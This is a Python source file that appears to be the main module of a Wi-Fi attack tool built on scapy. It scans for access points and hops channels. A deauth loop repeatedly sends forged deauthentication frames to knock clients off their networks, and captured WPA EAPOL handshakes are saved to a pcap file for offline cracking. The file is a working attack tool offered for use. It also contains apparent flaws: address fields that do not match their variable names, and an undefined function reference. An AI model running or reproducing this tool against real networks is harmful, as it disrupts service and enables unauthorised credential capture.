from scapy.all import *
from scapy.layers.dot11 import *
from scapy.layers.eap import *
import threading

import scapy.packet
from change_channel import change_channel
import gui

import scanner

# TODO:
# Support other types of frames to identify clients
# Show number of packets sent
# Show security standard

INTERFACE_NAME = 'wlan0mon'
START_CHANNEL = 1

# Map 2.4GHz frequencies to channels
CHANNEL_TABLE = {
    2412: 1,
    2417: 2,
    2422: 3,
    2427: 4,
    2432: 5,
    2437: 6,
    2442: 7,
    2447: 8,
    2452: 9,
    2457: 10,
    2462: 11,
    2467: 12,
    2472: 13,
    2484: 14,
}


def get_aps():
    return access_points


def save_capture(ap):
    """Save captured EAPOL messages and beacon frames to a .pcap file"""

    writer = PcapWriter('captures/handshake.pcap', append=True)
    for _, packet in ap.eapol_messages.items():
        writer.write(packet)
    writer.write(ap.beacon)


def deauth(ap, stop):
    """Craft and send deauthentication packets"""

    while not stop.is_set():
        for client in ap.clients:
            ap_to_client = RadioTap()/Dot11(type=0, subtype=12, addr1=ap.bssid, addr2=client, addr3=ap.bssid)/Dot11Deauth()
            client_to_ap = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=ap.bssid, addr3=ap.bssid)/Dot11Deauth()
            sendp(ap_to_client, iface=INTERFACE_NAME, verbose=False)
            sendp(client_to_ap, iface=INTERFACE_NAME, verbose=False)


def deauth_thread(ap, stop):
    thread = threading.Thread(target=deauth, args=(ap, stop,))
    return thread


access_points = []
# Access point MAC addresses
ap_bssids = set()
# BSSID:AccessPoint
bssid_map = {}
# SSID:AccessPoint
ssid_map = {}

stop_sniffing = threading.Event()
stop_changing_channel = threading.Event()
stop_deauthing = threading.Event()

print('Starting sniffing thread')
sniff_thread = scanner.create_sniff_thread()
sniff_thread.start()

print('Starting GUI thread')
gui_thread = threading.Thread(target=gui.start_gui, args=(get_aps, deauth_thread, INTERFACE_NAME, stop_sniffing, create_sniff_thread, stop_changing_channel, stop_deauthing, save_capture,))
gui_thread.start()

print('Starting channel switching thread')
channel_thread = threading.Thread(target=change_channel, args=(START_CHANNEL, INTERFACE_NAME, stop_changing_channel,))
channel_thread.start()

sniff_thread.join()
channel_thread.join()
